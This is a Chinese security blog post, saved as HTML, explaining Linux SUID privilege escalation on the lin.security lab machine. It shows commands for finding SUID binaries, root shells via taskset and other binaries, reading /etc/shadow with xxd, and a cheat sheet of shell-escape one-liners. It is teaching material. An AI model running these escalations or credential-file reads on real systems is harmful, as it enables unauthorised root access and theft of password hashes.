@@ -1,0 +1,336 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <title>Linux提权之suid提权 - ev1l0o4g&#39;s blog</title><meta name="Description" content="记录生活与学习"><meta property="og:title" content="Linux提权之suid提权" />
+<meta property="og:description" content="环境：靶场insecurity
+什么是suid SUID是赋予文件的一种特殊权限，具有这种特殊权限的文件会在其执行时，使调用者暂时获得该文件属主的权限。如果某些现有的二进制文件和实用程序具有SUID权限的话，就可以在执行时将权限提升为root。 SUID提权的原理与Linux进程的UID有关，进程在运行的时候有以下三个UID：
+1 2 3 （A）Real UID：执行该进程的用户的UID。Real UID只用于标识用户，不用于权限检查。 （B）Effective UID（EUID）：进程执行时生效的UID。在对访问目标进行操作时，系统会检查EUID是否有权限。一般情况下，Real UID与EUID相同，但在运行设置了SUID权限的程序时，进程的EUID会被设置为程序文件属主的UID。 （C）Saved UID：在高权限用户降权后，保留的UID。 如果某个设置了SUID权限的程序运行后创建了shell，那么shell进程的EUID也会是这个程序文件属主的UID，如果属主为root，便是一个root shell。root shell中运行的程序的EUID也都是0，具备超级权限，于是便实现了提权。 使用chmod u&#43;s [文件]命令为文件配置SUID权限。
+提权操作 suid提权其实就是查找具有特定suid权限的参数，再利用其参数进行提权命令调用。suid提权仅对可执行二进制文件有效。 查看本机用有suid权限的文件：
+1 2 3 4 find / -user root -perm -4000 -print 2&gt;/dev/null find / -perm -u=s -type f 2&gt;/dev/null find / -user root -perm -4000 -exec ls -ldb {} \; find / -perm -4000 -type f -exec ls -la {} 2&gt;/dev/null \; taskset
+执行命令 taskset 1 /bin/bash -p，成功获取到root权限，提权成功 xxd" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://ev1l0o4g.xyz/linux%E6%8F%90%E6%9D%83%E4%B9%8Bsuid%E6%8F%90%E6%9D%83/" /><meta property="og:image" content="https://ev1l0o4g.xyz/images/avatar.png"/><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2023-06-27T16:47:35+08:00" />
+<meta property="article:modified_time" content="2023-06-27T16:47:35+08:00" /><meta property="og:site_name" content="ev1l0o4g&#39;s blog" />
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://ev1l0o4g.xyz/images/avatar.png"/>
+
+<meta name="twitter:title" content="Linux提权之suid提权"/>
+<meta name="twitter:description" content="环境：靶场insecurity
+什么是suid SUID是赋予文件的一种特殊权限，具有这种特殊权限的文件会在其执行时，使调用者暂时获得该文件属主的权限。如果某些现有的二进制文件和实用程序具有SUID权限的话，就可以在执行时将权限提升为root。 SUID提权的原理与Linux进程的UID有关，进程在运行的时候有以下三个UID：
+1 2 3 （A）Real UID：执行该进程的用户的UID。Real UID只用于标识用户，不用于权限检查。 （B）Effective UID（EUID）：进程执行时生效的UID。在对访问目标进行操作时，系统会检查EUID是否有权限。一般情况下，Real UID与EUID相同，但在运行设置了SUID权限的程序时，进程的EUID会被设置为程序文件属主的UID。 （C）Saved UID：在高权限用户降权后，保留的UID。 如果某个设置了SUID权限的程序运行后创建了shell，那么shell进程的EUID也会是这个程序文件属主的UID，如果属主为root，便是一个root shell。root shell中运行的程序的EUID也都是0，具备超级权限，于是便实现了提权。 使用chmod u&#43;s [文件]命令为文件配置SUID权限。
+提权操作 suid提权其实就是查找具有特定suid权限的参数，再利用其参数进行提权命令调用。suid提权仅对可执行二进制文件有效。 查看本机用有suid权限的文件：
+1 2 3 4 find / -user root -perm -4000 -print 2&gt;/dev/null find / -perm -u=s -type f 2&gt;/dev/null find / -user root -perm -4000 -exec ls -ldb {} \; find / -perm -4000 -type f -exec ls -la {} 2&gt;/dev/null \; taskset
+执行命令 taskset 1 /bin/bash -p，成功获取到root权限，提权成功 xxd"/>
+<meta name="application-name" content="ev1l0o4g&#39;s blog">
+<meta name="apple-mobile-web-app-title" content="ev1l0o4g&#39;s blog"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="icon" href="/images/avatar.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://ev1l0o4g.xyz/linux%E6%8F%90%E6%9D%83%E4%B9%8Bsuid%E6%8F%90%E6%9D%83/" /><link rel="prev" href="https://ev1l0o4g.xyz/%E7%9B%AE%E6%A0%87%E8%B5%84%E4%BA%A7%E6%94%B6%E9%9B%86%E5%B0%8F%E7%BB%93/" /><link rel="next" href="https://ev1l0o4g.xyz/docker%E9%80%83%E9%80%B8%E5%88%A4%E6%96%AD%E4%B8%89%E4%B8%A4%E4%BA%8B/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css"></noscript><link rel="preload" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css"></noscript><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "Linux提权之suid提权",
+        "inLanguage": "zh-CN",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/ev1l0o4g.xyz\/linux%E6%8F%90%E6%9D%83%E4%B9%8Bsuid%E6%8F%90%E6%9D%83\/"
+        },"image": ["https:\/\/ev1l0o4g.xyz\/images\/Apple-Devices-Preview.png"],"genre": "posts","keywords": "提权","wordcount":  164 ,
+        "url": "https:\/\/ev1l0o4g.xyz\/linux%E6%8F%90%E6%9D%83%E4%B9%8Bsuid%E6%8F%90%E6%9D%83\/","datePublished": "2023-06-27T16:47:35+08:00","dateModified": "2023-06-27T16:47:35+08:00","publisher": {
+            "@type": "Organization",
+            "name": "ev1l0o4g","logo": {
+                    "@type": "ImageObject",
+                    "url": "https:\/\/ev1l0o4g.xyz\/images\/avatar.png",
+                    "width":  850 ,
+                    "height":  629 
+                }},"author": {
+                "@type": "Person",
+                "name": "ev1l0o4g"
+            },"description": ""
+    }
+    </script></head>
+    <body data-header-desktop="fixed" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="ev1l0o4g&#39;s blog"><span class="header-title-pre"><i class='far fa-kiss-wink-heart fa-fw' aria-hidden='true'></i></span><span id="id-1" class="typeit"></span></a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> 所有文章 </a><a class="menu-item" href="https://mynav.ev1l0o4g.xyz/" rel="noopener noreffer" target="_blank"> 导航页 </a><a class="menu-item" href="https://ai.ev1l0o4g.xyz" rel="noopener noreffer" target="_blank"> AI </a><a class="menu-item" href="/tags/"> 标签 </a><a class="menu-item" href="/categories/"> 分类 </a><a class="menu-item" href="/tools/tools"> 武器库 </a><a class="menu-item" href="/friends/friends"> 友链 </a><a class="menu-item" href="/about/about"> 关于 </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="搜索文章标题或内容..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="搜索">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="清空">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="切换主题">
+                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+                </a></div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="ev1l0o4g&#39;s blog"><span class="header-title-pre"><i class='far fa-kiss-wink-heart fa-fw' aria-hidden='true'></i></span><span id="id-2" class="typeit"></span></a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="搜索文章标题或内容..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="搜索">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="清空">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        取消
+                    </a>
+                </div><a class="menu-item" href="/posts/" title="">所有文章</a><a class="menu-item" href="https://mynav.ev1l0o4g.xyz/" title="" rel="noopener noreffer" target="_blank">导航页</a><a class="menu-item" href="https://ai.ev1l0o4g.xyz" title="" rel="noopener noreffer" target="_blank">AI</a><a class="menu-item" href="/tags/" title="">标签</a><a class="menu-item" href="/categories/" title="">分类</a><a class="menu-item" href="/tools/tools" title="">武器库</a><a class="menu-item" href="/friends/friends" title="">友链</a><a class="menu-item" href="/about/about" title="">关于</a><a href="javascript:void(0);" class="menu-item theme-switch" title="切换主题">
+                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+            </a></div>
+    </div>
+</header><div class="search-dropdown desktop">
+        <div id="search-dropdown-desktop"></div>
+    </div>
+    <div class="search-dropdown mobile">
+        <div id="search-dropdown-mobile"></div>
+    </div><main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">目录</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">Linux提权之suid提权</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel="author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>ev1l0o4g</a></span>&nbsp;<span class="post-category">收录于 <a href="/categories/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>内网安全</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2023-06-27">2023-06-27</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;约 164 字&nbsp;
+                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;预计阅读 1 分钟&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  data-kept="">
+                <div class="details-summary toc-title">
+                    <span>目录</span>
+                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#什么是suid">什么是suid</a></li>
+    <li><a href="#提权操作">提权操作</a></li>
+    <li><a href="#参考文章">参考文章</a></li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><p>环境：靶场<a href="https://in.security/downloads/lin.security_v1.0.ova" target="_blank" rel="noopener noreffer ">insecurity</a></p>
+<h1 id="什么是suid">什么是suid</h1>
+<p>SUID是赋予文件的一种特殊权限，具有这种特殊权限的文件会在其执行时，使调用者暂时获得该文件属主的权限。如果某些现有的二进制文件和实用程序具有SUID权限的话，就可以在执行时将权限提升为root。
+SUID提权的原理与Linux进程的UID有关，进程在运行的时候有以下三个UID：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">（A）Real UID：执行该进程的用户的UID。Real UID只用于标识用户，不用于权限检查。
+</span></span><span class="line"><span class="cl">（B）Effective UID（EUID）：进程执行时生效的UID。在对访问目标进行操作时，系统会检查EUID是否有权限。一般情况下，Real UID与EUID相同，但在运行设置了SUID权限的程序时，进程的EUID会被设置为程序文件属主的UID。
+</span></span><span class="line"><span class="cl">（C）Saved UID：在高权限用户降权后，保留的UID。
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>如果某个设置了SUID权限的程序运行后创建了shell，那么shell进程的EUID也会是这个程序文件属主的UID，如果属主为root，便是一个root shell。root shell中运行的程序的EUID也都是0，具备超级权限，于是便实现了提权。
+使用<code>chmod  u+s  [文件]</code>命令为文件配置SUID权限。</p>
+<h1 id="提权操作">提权操作</h1>
+<p>suid提权其实就是查找具有特定suid权限的参数，再利用其参数进行提权命令调用。suid提权仅对可执行二进制文件有效。
+查看本机用有suid权限的文件：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">find / -user root -perm -4000 -print 2&gt;/dev/null
+</span></span><span class="line"><span class="cl">find / -perm -u=s -type f 2&gt;/dev/null
+</span></span><span class="line"><span class="cl">find / -user root -perm -4000 -exec ls -ldb {} \;
+</span></span><span class="line"><span class="cl">find / -perm -4000 -type f -exec ls -la {} 2&gt;/dev/null \;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://s2.loli.net/2022/10/14/zIuHJPSRo1kTWie.png"
+        data-srcset="https://s2.loli.net/2022/10/14/zIuHJPSRo1kTWie.png, https://s2.loli.net/2022/10/14/zIuHJPSRo1kTWie.png 1.5x, https://s2.loli.net/2022/10/14/zIuHJPSRo1kTWie.png 2x"
+        data-sizes="auto"
+        alt="https://s2.loli.net/2022/10/14/zIuHJPSRo1kTWie.png"
+        title="https://s2.loli.net/2022/10/14/zIuHJPSRo1kTWie.png" /></p>
+<ul>
+<li>
+<p>taskset</p>
+<p>执行命令<code> taskset 1 /bin/bash -p</code>，成功获取到root权限，提权成功
+<img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://s2.loli.net/2022/10/14/Z1TGsXDz6lm4Sn2.png"
+        data-srcset="https://s2.loli.net/2022/10/14/Z1TGsXDz6lm4Sn2.png, https://s2.loli.net/2022/10/14/Z1TGsXDz6lm4Sn2.png 1.5x, https://s2.loli.net/2022/10/14/Z1TGsXDz6lm4Sn2.png 2x"
+        data-sizes="auto"
+        alt="https://s2.loli.net/2022/10/14/Z1TGsXDz6lm4Sn2.png"
+        title="https://s2.loli.net/2022/10/14/Z1TGsXDz6lm4Sn2.png" /></p>
+</li>
+<li>
+<p>xxd</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://s2.loli.net/2022/10/14/ERVxY5msIcX8bS3.png"
+        data-srcset="https://s2.loli.net/2022/10/14/ERVxY5msIcX8bS3.png, https://s2.loli.net/2022/10/14/ERVxY5msIcX8bS3.png 1.5x, https://s2.loli.net/2022/10/14/ERVxY5msIcX8bS3.png 2x"
+        data-sizes="auto"
+        alt="https://s2.loli.net/2022/10/14/ERVxY5msIcX8bS3.png"
+        title="https://s2.loli.net/2022/10/14/ERVxY5msIcX8bS3.png" /></p>
+</li>
+<li>
+<p>发现itservices组具有执行权限，查看所属组用户：<code>cat /etc/group | grep itservices</code></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://s2.loli.net/2022/10/14/zhU9coCD1iOm4fB.png"
+        data-srcset="https://s2.loli.net/2022/10/14/zhU9coCD1iOm4fB.png, https://s2.loli.net/2022/10/14/zhU9coCD1iOm4fB.png 1.5x, https://s2.loli.net/2022/10/14/zhU9coCD1iOm4fB.png 2x"
+        data-sizes="auto"
+        alt="https://s2.loli.net/2022/10/14/zhU9coCD1iOm4fB.png"
+        title="https://s2.loli.net/2022/10/14/zhU9coCD1iOm4fB.png" /></p>
+<p>存在用户susan，使用上一篇发现的susan密码登录</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://s2.loli.net/2022/10/14/KbApkFh8VO31fu5.png"
+        data-srcset="https://s2.loli.net/2022/10/14/KbApkFh8VO31fu5.png, https://s2.loli.net/2022/10/14/KbApkFh8VO31fu5.png 1.5x, https://s2.loli.net/2022/10/14/KbApkFh8VO31fu5.png 2x"
+        data-sizes="auto"
+        alt="https://s2.loli.net/2022/10/14/KbApkFh8VO31fu5.png"
+        title="https://s2.loli.net/2022/10/14/KbApkFh8VO31fu5.png" /></p>
+<p>susan无法访问shadow文件，说明权限不够，使用xxd提权访问shadow文件：<code>xxd &quot;/etc/shadow&quot; | xxd -r</code></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://s2.loli.net/2022/10/14/yRYsT4ka65cXHdo.png"
+        data-srcset="https://s2.loli.net/2022/10/14/yRYsT4ka65cXHdo.png, https://s2.loli.net/2022/10/14/yRYsT4ka65cXHdo.png 1.5x, https://s2.loli.net/2022/10/14/yRYsT4ka65cXHdo.png 2x"
+        data-sizes="auto"
+        alt="https://s2.loli.net/2022/10/14/yRYsT4ka65cXHdo.png"
+        title="https://s2.loli.net/2022/10/14/yRYsT4ka65cXHdo.png" /></p>
+</li>
+<li>
+<p>其他
+常用的suid提权有<code>nmap</code>、<code>vim</code>、<code>find</code>、<code>bash</code>、<code>more</code>、<code>less</code>、<code>nano</code>和<code>cp</code>等，但这些在靶场不具备环境</p>
+<ul>
+<li>find:<code>find . -exec /bin/sh -p \; -quit</code></li>
+<li>bash:<code>bash -p</code></li>
+<li>awk:<code>awk 'BEGIN {system(&quot;/bin/bash&quot;)}'</code></li>
+<li>ruby:<code>exec &quot;/bin/bash&quot;;</code></li>
+<li>python:<code>python -c 'import os; os.execl(&quot;/bin/sh&quot;,&quot;sh&quot;,&quot;-p&quot;)'</code></li>
+<li>cp:<code>sh -c 'cp $(which cp) .; chmod +s ./cp'</code></li>
+<li>chmod:<code>sh -c 'cp $(which chmod) .; chmod +s ./chmod'</code></li>
+<li>flock:<code>flock -u / /bin/sh -p</code></li>
+<li>vim:
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">vim.tiny
+</span></span><span class="line"><span class="cl"># Press ESC key
+</span></span><span class="line"><span class="cl">:set shell=/bin/sh
+</span></span><span class="line"><span class="cl">:shell
+</span></span></code></pre></td></tr></table>
+</div>
+</div></li>
+<li>less:
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">less /etc/passwd
+</span></span><span class="line"><span class="cl">!/bin/sh
+</span></span></code></pre></td></tr></table>
+</div>
+</div></li>
+<li>man:
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">man passwd
+</span></span><span class="line"><span class="cl">!/bin/bash
+</span></span></code></pre></td></tr></table>
+</div>
+</div></li>
+<li>make
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">COMMAND=’/bin/sh -p’
+</span></span><span class="line"><span class="cl">make -s –eval=$’x:\n\t-‘”$COMMAND”
+</span></span></code></pre></td></tr></table>
+</div>
+</div></li>
+</ul>
+<h1 id="参考文章">参考文章</h1>
+<p><a href="http://blog.nsfocus.net/linux/" target="_blank" rel="noopener noreffer ">http://blog.nsfocus.net/linux/</a></p>
+<p><a href="http://t.zoukankan.com/tomyyyyy-p-14659298.html" target="_blank" rel="noopener noreffer ">http://t.zoukankan.com/tomyyyyy-p-14659298.html</a></p>
+</li>
+</ul>
+</div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>更新于 2023-06-27</span>
+            </div></div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share">
+                <span></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/%E6%8F%90%E6%9D%83/">提权</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">返回</a></span>&nbsp;|&nbsp;<span><a href="/">主页</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/%E7%9B%AE%E6%A0%87%E8%B5%84%E4%BA%A7%E6%94%B6%E9%9B%86%E5%B0%8F%E7%BB%93/" class="prev" rel="prev" title="目标资产收集小结"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>目标资产收集小结</a>
+            <a href="/docker%E9%80%83%E9%80%B8%E5%88%A4%E6%96%AD%E4%B8%89%E4%B8%A4%E4%BA%8B/" class="next" rel="next" title="Docker逃逸判断三两事">Docker逃逸判断三两事<i class="fas fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+</article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line">由 <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.114.1">Hugo</a> 强力驱动 | 主题 - <a href="https://github.com/dillonzq/LoveIt" target="_blank" rel="noopener noreffer" title="LoveIt 0.2.11"><i class="far fa-kiss-wink-heart fa-fw" aria-hidden="true"></i> LoveIt</a>
+                </div><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2022 - 2023</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">ev1l0o4g</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="回到顶部">
+                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="查看评论">
+                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
+            </a>
+        </div><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/autocomplete.js@0.38.1/dist/autocomplete.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/algoliasearch@4.13.1/dist/algoliasearch-lite.umd.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lazysizes@5.3.2/lazysizes.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/clipboard@2.0.11/dist/clipboard.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/typeit@8.6.0/dist/index.umd.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"复制到剪贴板","maxShownLines":50},"comment":{},"data":{"id-1":"ev1l0o4g's blog","id-2":"ev1l0o4g's blog"},"search":{"algoliaAppID":"","algoliaIndex":"","algoliaSearchKey":"","highlightTag":"em","maxResultLength":10,"noResultsFound":"没有找到结果","snippetLength":30,"type":"algolia"},"typeit":{"cursorChar":"|","cursorSpeed":1000,"data":{"id-1":["id-1"],"id-2":["id-2"]},"duration":-1,"speed":100}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+</html>
